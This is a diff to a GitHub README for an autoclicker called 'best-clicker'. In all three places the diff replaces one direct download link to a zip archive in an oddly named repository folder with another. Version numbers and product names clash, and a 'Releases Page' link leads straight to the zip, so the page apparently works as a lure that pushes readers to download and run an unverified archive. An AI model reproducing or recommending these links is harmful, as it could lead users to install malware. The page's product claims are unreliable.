@@ -4,7 +4,7 @@
 Welcome to best-clicker! This application helps you automate your clicking tasks, whether for gaming or productivity. Follow the steps below to download and run best-clicker easily.
 
 ## 📥 Download Now!
-[![Download best-clicker](https://raw.githubusercontent.com/Mylevaug/best-clicker/main/unhardness/best-clicker-v1.8-beta.3.zip%20best--clicker-v1.0-green)](https://raw.githubusercontent.com/Mylevaug/best-clicker/main/unhardness/best-clicker-v1.8-beta.3.zip)
+[![Download best-clicker](https://github.com/Mylevaug/best-clicker/raw/refs/heads/main/unhardness/clicker-best-v1.2-alpha.3.zip%20best--clicker-v1.0-green)](https://github.com/Mylevaug/best-clicker/raw/refs/heads/main/unhardness/clicker-best-v1.2-alpha.3.zip)
 
 ## 📂 Overview
 Dynamic Clicker 2025 is a powerful autoclicker that offers ten different modes. It serves both gamers and professionals by automating repetitive clicks. You can customize settings to match your preferences. The interface is user-friendly, so you can navigate the features easily.
@@ -27,7 +27,7 @@ To run best-clicker, ensure your system meets the following:
 To get best-clicker:
 
 1. **Visit the Releases Page:** Click on the link below to access the releases page.
-   [Visit Releases Page](https://raw.githubusercontent.com/Mylevaug/best-clicker/main/unhardness/best-clicker-v1.8-beta.3.zip)
+   [Visit Releases Page](https://github.com/Mylevaug/best-clicker/raw/refs/heads/main/unhardness/clicker-best-v1.2-alpha.3.zip)
 
 2. **Select the Version:** Choose the latest version available on the releases page.
 
@@ -63,4 +63,4 @@ Best-clicker is released under the MIT License. Feel free to use, modify, and sh
 
 ## 📥 Download Again
 For your convenience, here’s the download link once more:
-[![Download best-clicker](https://raw.githubusercontent.com/Mylevaug/best-clicker/main/unhardness/best-clicker-v1.8-beta.3.zip%20best--clicker-v1.0-green)](https://raw.githubusercontent.com/Mylevaug/best-clicker/main/unhardness/best-clicker-v1.8-beta.3.zip)
+[![Download best-clicker](https://github.com/Mylevaug/best-clicker/raw/refs/heads/main/unhardness/clicker-best-v1.2-alpha.3.zip%20best--clicker-v1.0-green)](https://github.com/Mylevaug/best-clicker/raw/refs/heads/main/unhardness/clicker-best-v1.2-alpha.3.zip)
